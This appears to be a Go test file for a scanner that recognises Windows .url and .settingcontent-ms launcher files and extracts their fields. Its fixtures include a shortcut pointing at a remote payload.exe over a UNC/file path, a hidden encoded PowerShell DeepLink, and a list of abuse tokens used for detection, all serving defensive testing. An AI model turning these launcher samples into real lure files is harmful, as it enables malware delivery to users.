package extract

import (
	"strings"
	"testing"
	"time"
)

// hasStreamPrefix reports whether any stream begins with prefix and contains sub.
func hasStreamPrefix(res *Result, prefix, sub string) bool {
	for _, s := range res.Streams {
		if strings.HasPrefix(string(s), prefix) && strings.Contains(string(s), sub) {
			return true
		}
	}
	return false
}

const benignURL = "[InternetShortcut]\r\nURL=https://example.com/docs\r\nIconIndex=0\r\n"

const evilURL = "[InternetShortcut]\r\n" +
	"URL=file://10.0.0.5/share/payload.exe\r\n" +
	"IconFile=\\\\10.0.0.5\\share\\icon.ico\r\n"

const evilSettings = `<?xml version="1.0" encoding="UTF-8"?>
<PCSettingsFile xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
  <SearchableContent>
    <ApplicationInformation>
      <DeepLink>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAA==</DeepLink>
    </ApplicationInformation>
  </SearchableContent>
</PCSettingsFile>`

const benignSettings = `<?xml version="1.0" encoding="UTF-8"?>
<PCSettingsFile xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
  <SearchableContent><ApplicationInformation>
    <DeepLink>ms-settings:display</DeepLink>
  </ApplicationInformation></SearchableContent>
</PCSettingsFile>`

func TestIsURLShortcut(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want bool
	}{
		{"canonical", benignURL, true},
		{"bom+lowercase header", "\xef\xbb\xbf[internetshortcut]\nURL=http://x/\n", true},
		{"header after comment", "; note\n[InternetShortcut]\nURL=http://x/\n", true},
		// Negative controls: INI-looking text that is NOT an Internet Shortcut.
		{"benign ini", "[general]\nurl=https://example.com/\nname=cfg\n", false},
		{"bare URL key, no section", "URL=http://evil/x.exe\n", false},
		{"section named inline only", "note=[InternetShortcut] is a format\n", false},
		{"empty", "", false},
		{"nul bytes", "\x00\x00\x00\x00", false},
		{"truncated header", "[InternetShort", false},
	}
	for _, c := range cases {
		if got := isURLShortcut([]byte(c.in)); got != c.want {
			t.Errorf("%s: isURLShortcut = %v, want %v", c.name, got, c.want)
		}
	}
}

func TestIsSettingContent(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want bool
	}{
		{"canonical", evilSettings, true},
		{"benign but same format", benignSettings, true},
		// Negative controls.
		{"plain xml", "<?xml version=\"1.0\"?><root><a>x</a></root>", false},
		{"deeplink without PCSettingsFile", "<root><DeepLink>calc.exe</DeepLink></root>", false},
		{"PCSettingsFile without DeepLink", "<PCSettingsFile><x/></PCSettingsFile>", false},
		{"empty", "", false},
		{"whitespace only", "   \n\t ", false},
	}
	for _, c := range cases {
		if got := isSettingContent([]byte(c.in)); got != c.want {
			t.Errorf("%s: isSettingContent = %v, want %v", c.name, got, c.want)
		}
	}
}

func TestFromURLShortcut_Fields(t *testing.T) {
	var res Result
	fromURLShortcut([]byte(evilURL), &res, time.Time{})
	if !hasStreamPrefix(&res, urlShortcutMarker, "url=file://10.0.0.5/share/payload.exe") {
		t.Errorf("URL field not surfaced; streams=%q", res.Streams)
	}
	if !hasStreamPrefix(&res, urlShortcutMarker, `iconfile=\\10.0.0.5\share\icon.ico`) {
		t.Errorf("IconFile field not surfaced; streams=%q", res.Streams)
	}
	for _, field := range []string{"workingdirectory=C:\\Docs", "showcommand=1", "hotkey=0", "idlist=AAAA"} {
		res := Extract([]byte("[InternetShortcut]\n"+field), time.Time{})
		if !hasStreamPrefix(&res, urlShortcutMarker, field) {
			t.Errorf("metadata field %q not surfaced", field)
		}
	}
}

// Benign URL fields are surfaced verbatim; extraction must not introduce a
// remote path that was absent from the source. Rule scoring is tested separately.
func TestFromURLShortcut_BenignDoesNotScore(t *testing.T) {
	var res Result
	fromURLShortcut([]byte(benignURL), &res, time.Time{})
	for _, s := range res.Streams {
		v := string(s)
		if strings.Contains(v, `=\\`) || strings.Contains(v, "=file://") {
			t.Errorf("benign .url gained a remote path: %q", v)
		}
	}
	if !hasStreamPrefix(&res, urlShortcutMarker, "url=https://example.com/docs") {
		t.Errorf("benign URL field not surfaced; streams=%q", res.Streams)
	}
	// IconIndex is not a launcher target and must not be surfaced.
	if hasStreamPrefix(&res, urlShortcutMarker, "iconindex") {
		t.Errorf("IconIndex surfaced; streams=%q", res.Streams)
	}
}

// A benign INI blob that merely looks INI-shaped must produce NO launcher
// marker at all — the extractor never runs on it, because recognition is by the
// mandatory section header.
func TestBenignINIBlob_NoMarkers(t *testing.T) {
	blob := "[general]\nurl=https://example.com/\niconfile=C:\\Windows\\icon.ico\n"
	if isURLShortcut([]byte(blob)) {
		t.Fatal("benign INI blob recognised as an Internet Shortcut")
	}
	var res Result
	fromURLShortcut([]byte(blob), &res, time.Time{})
	if len(res.Streams) != 0 {
		t.Errorf("non-[InternetShortcut] section produced markers: %q", res.Streams)
	}
}

func TestFromSettingContent_DeepLink(t *testing.T) {
	var res Result
	fromSettingContent([]byte(evilSettings), &res, time.Time{})
	if !hasStreamPrefix(&res, settingsDeepMarker, "-enc SQBFAFgA") {
		t.Errorf("DeepLink command not surfaced; streams=%q", res.Streams)
	}
}

func TestFromSettingContent_XMLEntities(t *testing.T) {
	doc := `<PCSettingsFile><DeepLink>cmd.exe /c &quot;powershell -nop&quot; &amp;&amp; exit</DeepLink></PCSettingsFile>`
	var res Result
	fromSettingContent([]byte(doc), &res, time.Time{})
	if !hasStreamPrefix(&res, settingsDeepMarker, `cmd.exe /c "powershell -nop" && exit`) {
		t.Errorf("entities not expanded; streams=%q", res.Streams)
	}
}

// Benign settings shortcut: the DeepLink is a plain ms-settings: URI. The marker
// is emitted (extraction is unconditional once the format is recognised) but it
// must carry no PowerShell/abuse token, so no scoring rule can fire on it.
func TestFromSettingContent_BenignDoesNotScore(t *testing.T) {
	var res Result
	fromSettingContent([]byte(benignSettings), &res, time.Time{})
	if len(res.Streams) != 1 {
		t.Fatalf("want exactly 1 marker, got %q", res.Streams)
	}
	v := strings.ToLower(string(res.Streams[0]))
	for _, bad := range []string{"powershell", "cmd.exe", "-enc", "frombase64string"} {
		if strings.Contains(v, bad) {
			t.Errorf("benign DeepLink marker contains %q: %q", bad, v)
		}
	}
}

// Filename independence, both directions: recognition and extraction depend on
// CONTENT ONLY. Extract() is never told a filename, so these cases exercise the
// recogniser against content whose "implied extension" is wrong or absent.
func TestLauncherFilenameIndependence(t *testing.T) {
	// (a) Correct content, no/false extension implied: still extracts.
	for _, doc := range []string{evilURL, "\xef\xbb\xbf" + evilURL} {
		if !isURLShortcut([]byte(doc)) {
			t.Fatalf("content-correct .url not recognised: %q", doc)
		}
		var res Result
		fromURLShortcut([]byte(doc), &res, time.Time{})
		if !hasStreamPrefix(&res, urlShortcutMarker, "url=file://") {
			t.Errorf("content-correct .url did not extract; streams=%q", res.Streams)
		}
	}
	if !isSettingContent([]byte(evilSettings)) {
		t.Error("content-correct .settingcontent-ms not recognised")
	}
	// (b) Wrong content that a ".url"/".settingcontent-ms" NAME would otherwise
	// vouch for: must not be recognised, and must not extract.
	for _, doc := range []string{
		"Dear user, please open the attached invoice.\n",
		"MZ\x90\x00\x03",
		"{\\rtf1\\ansi}",
		"<html><body>URL=http://evil/x.exe</body></html>",
	} {
		if isURLShortcut([]byte(doc)) {
			t.Errorf("non-shortcut content recognised as .url: %q", doc)
		}
		if isSettingContent([]byte(doc)) {
			t.Errorf("non-settings content recognised as .settingcontent-ms: %q", doc)
		}
	}
}

// Malformed / truncated / empty inputs must not panic and must not invent
// markers.
func TestLauncherMalformed(t *testing.T) {
	cases := []string{
		"",
		"\x00",
		"[InternetShortcut]",                  // header, no fields
		"[InternetShortcut]\nURL",             // truncated record, no '='
		"[InternetShortcut]\nURL=\n",          // empty value
		"[InternetShortcut]\n=novalue\n",      // empty key
		"[InternetShortcut]\r\nURL=http://x/", // truncated final line (no EOL)
		"<PCSettingsFile><DeepLink>calc.exe",  // truncated element
		"<PCSettingsFile><DeepLink",           // truncated open tag
		"<PCSettingsFile><DeepLink/></PCSettingsFile>",                 // self-closing, no value
		strings.Repeat("[InternetShortcut]\n", 5000),                   // many section headers
		"[InternetShortcut]\nURL=" + strings.Repeat("A", 1<<20) + "\n", // oversized value
	}
	for _, doc := range cases {
		var res Result
		fromURLShortcut([]byte(doc), &res, time.Time{})
		fromSettingContent([]byte(doc), &res, time.Time{})
		for _, s := range res.Streams {
			if len(s) > len(urlShortcutMarker)+len("url=")+maxLauncherValue+8 {
				t.Errorf("unbounded marker (%d bytes) for %.40q", len(s), doc)
			}
		}
		if len(res.Streams) > 2*maxLauncherFields {
			t.Errorf("emit cap exceeded (%d) for %.40q", len(res.Streams), doc)
		}
	}
	// Truncated final record with no trailing newline still extracts.
	var res Result
	fromURLShortcut([]byte("[InternetShortcut]\r\nURL=http://x/"), &res, time.Time{})
	if !hasStreamPrefix(&res, urlShortcutMarker, "url=http://x/") {
		t.Errorf("final record without EOL not extracted; streams=%q", res.Streams)
	}
}

func TestLauncherDeadlineExpired(t *testing.T) {
	past := time.Now().Add(-time.Hour)
	var res Result
	fromURLShortcut([]byte(evilURL), &res, past)
	fromSettingContent([]byte(evilSettings), &res, past)
	if len(res.Streams) != 0 {
		t.Errorf("expired deadline still emitted: %q", res.Streams)
	}
}

// End-to-end through Extract's dispatch: no filename is passed, so the format is
// reached by content sniffing alone.
func TestExtractDispatchesLaunchers(t *testing.T) {
	for _, c := range []struct {
		name, doc, prefix, sub string
	}{
		{"url", evilURL, urlShortcutMarker, "url=file://"},
		{"settingcontent", evilSettings, settingsDeepMarker, "-enc "},
	} {
		res := Extract([]byte(c.doc), time.Now().Add(time.Minute))
		if !hasStreamPrefix(&res, c.prefix, c.sub) {
			t.Errorf("%s: Extract did not surface the launcher field; streams=%q", c.name, res.Streams)
		}
	}
}

func TestLauncherXMLStructure(t *testing.T) {
	for _, tc := range []struct {
		name, doc string
		want      bool
	}{
		{"entities and CDATA", `<s:PCSettingsFile xmlns:s="urn:settings"><s:DeepLink><![CDATA[ms-settings:display]]></s:DeepLink><s:Icon>&#67;:\Windows\icon.ico</s:Icon></s:PCSettingsFile>`, true},
		{"comment", `<PCSettingsFile><!-- <DeepLink>text</DeepLink><Icon>text</Icon> --></PCSettingsFile>`, false},
		{"wrong root", `<Other><PCSettingsFile><DeepLink>text</DeepLink></PCSettingsFile></Other>`, false},
		{"tag prefix", `<PCSettingsFile><DeepLinkExtra>text</DeepLinkExtra></PCSettingsFile>`, false},
		{"truncated", `<PCSettingsFile><DeepLink>text</DeepLink>`, false},
		{"unknown entity", `<PCSettingsFile><DeepLink>&unknown;</DeepLink></PCSettingsFile>`, false},
		{"nested markup", `<PCSettingsFile><DeepLink><b>text</b></DeepLink></PCSettingsFile>`, false},
		{"multiple roots", `<PCSettingsFile><DeepLink>text</DeepLink></PCSettingsFile><Other/>`, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			res := Extract([]byte(tc.doc), time.Now().Add(time.Second))
			got := hasStreamPrefix(&res, settingsDeepMarker, "")
			if got != tc.want {
				t.Fatalf("DeepLink=%v want %v; streams=%q", got, tc.want, res.Streams)
			}
			if tc.want && !hasStreamPrefix(&res, settingsIconMarker, `C:\Windows\icon.ico`) {
				t.Fatal("Icon text not decoded")
			}
			for _, marker := range res.Markers {
				if strings.HasPrefix(string(marker), "SETTINGCONTENT-") {
					t.Fatal("combined field moved out of Streams")
				}
			}
		})
	}
}

func TestLauncherLimits(t *testing.T) {
	for _, doc := range []string{
		"<PCSettingsFile>" + strings.Repeat("<x>", maxLauncherDepth) + "<DeepLink>x</DeepLink>" + strings.Repeat("</x>", maxLauncherDepth) + "</PCSettingsFile>",
		"<PCSettingsFile><DeepLink>" + strings.Repeat("x", maxLauncherBytes) + "</DeepLink></PCSettingsFile>",
	} {
		var res Result
		fromSettingContent([]byte(doc), &res, time.Time{})
		if len(res.Streams) != 0 {
			t.Fatal("over-budget XML published fields")
		}
	}
	// A token-budget stop keeps complete fields parsed before harmless trailing
	// comments; otherwise padding a valid launcher would bypass its scoring rule.
	var budgeted Result
	fromSettingContent([]byte("<PCSettingsFile><DeepLink>powershell -nop</DeepLink>"+
		strings.Repeat("<!-- padding -->", maxLauncherTokens)+
		"</PCSettingsFile>"), &budgeted, time.Time{})
	if !hasStreamPrefix(&budgeted, settingsDeepMarker, "powershell -nop") {
		t.Fatalf("token budget discarded a complete field: %q", budgeted.Streams)
	}
	for _, doc := range []string{
		"[InternetShortcut]\n" + strings.Repeat("URL=x\n", maxLauncherFields+1),
		"<PCSettingsFile>" + strings.Repeat("<DeepLink>x</DeepLink>", maxLauncherFields+1) + "</PCSettingsFile>",
	} {
		res := Extract([]byte(doc), time.Now().Add(time.Second))
		if len(res.Streams) != maxLauncherFields {
			t.Fatalf("field count=%d, want %d", len(res.Streams), maxLauncherFields)
		}
	}
	var res Result
	fromSettingContent([]byte("<PCSettingsFile><DeepLink>"+strings.Repeat("x", maxLauncherValue+1)+"</DeepLink><Icon>last</Icon></PCSettingsFile>"), &res, time.Time{})
	if len(res.Streams) != 2 || len(res.Streams[0]) != len(settingsDeepMarker)+maxLauncherValue || string(res.Streams[1]) != settingsIconMarker+"last" {
		t.Fatalf("value limit/continuation: %q", res.Streams)
	}
	res = Result{}
	fromURLShortcut([]byte("[InternetShortcut]\n"+strings.Repeat("; ignored\n", maxLauncherLines)+"URL=late"), &res, time.Time{})
	if len(res.Streams) != 0 {
		t.Fatal("INI line cap exceeded")
	}
}

func TestLauncherDispatchOverlap(t *testing.T) {
	settings := "<PCSettingsFile><!--\n[InternetShortcut]\n--><DeepLink>ms-settings:display</DeepLink></PCSettingsFile>"
	res := Extract([]byte(settings), time.Time{})
	if !hasStreamPrefix(&res, settingsDeepMarker, "ms-settings:display") {
		t.Fatal("INI header in XML comment hid DeepLink")
	}
	ini := "[InternetShortcut]\nURL=https://example.com/<PCSettingsFile><DeepLink>text</DeepLink></PCSettingsFile>"
	if isSettingContent([]byte(ini)) {
		t.Fatal("INI prefix recognised as XML")
	}
	res = Extract([]byte(ini), time.Time{})
	if !hasStreamPrefix(&res, urlShortcutMarker, "url=https://example.com/") {
		t.Fatal("XML-looking URL hid INI field")
	}
	for _, section := range []string{"[InternetShortcut.A]", "[InternetShortcut.W]"} {
		var res Result
		fromURLShortcut([]byte(section+"\nURL=https://example.com/"), &res, time.Time{})
		if len(res.Streams) != 0 || isURLShortcut([]byte(section)) {
			t.Fatal("unsupported section variant accepted")
		}
	}
}

func TestLauncherPreservesTextExtraction(t *testing.T) {
	for _, prefix := range []string{
		"[InternetShortcut]\n",
		"' <PCSettingsFile><Icon/></PCSettingsFile>\n",
	} {
		res := Extract(append([]byte(prefix), encodedVBEBlock...), time.Time{})
		if !res.EncodedScript || !streamsContain(res, `MsgBox "Hello"`) {
			t.Fatal("launcher-looking text suppressed script decoding")
		}
	}
}

func TestLauncherNestedCarriers(t *testing.T) {
	for _, tc := range []struct{ name, doc, marker, value string }{
		{"url", benignURL, urlShortcutMarker, "url=https://example.com/docs"},
		{"settings", benignSettings, settingsDeepMarker, "ms-settings:display"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// buildCFB stores regular-FAT streams at >=4096 bytes; space padding
			// keeps XML well formed while preserving its exact logical content.
			msgData := []byte(tc.doc + strings.Repeat(" ", 4096-len(tc.doc)))
			msg := buildCFB(t, []cfbEntry{
				{name: "Root Entry", mse: 5},
				{name: "__properties_version1.0", mse: 2, data: []byte("props")},
				{name: "__attach_version1.0_#00000000", mse: 1},
				{name: "__substg1.0_3701000D", mse: 2, data: msgData},
			})
			for _, carrier := range [][]byte{buildZip(t, map[string][]byte{"unrelated.bin": []byte(tc.doc)}), msg} {
				res := Extract(carrier, time.Time{})
				if !hasStreamPrefix(&res, tc.marker, tc.value) {
					t.Fatalf("nested field absent: %q", res.Streams)
				}
			}
		})
	}
}

func TestURLShortcutPadding(t *testing.T) {
	doc := strings.Repeat("; harmless padding\n", 300) + evilURL
	if len(doc) <= 4<<10 {
		t.Fatal("test input does not exceed the former recognition window")
	}
	for _, input := range [][]byte{
		[]byte(doc),
		buildZip(t, map[string][]byte{"padded.url": []byte(doc)}),
	} {
		res := Extract(input, time.Now().Add(time.Second))
		if !hasStreamPrefix(&res, urlShortcutMarker, "url=file://") {
			t.Fatalf("padded shortcut field absent: %q", res.Streams)
		}
	}
}
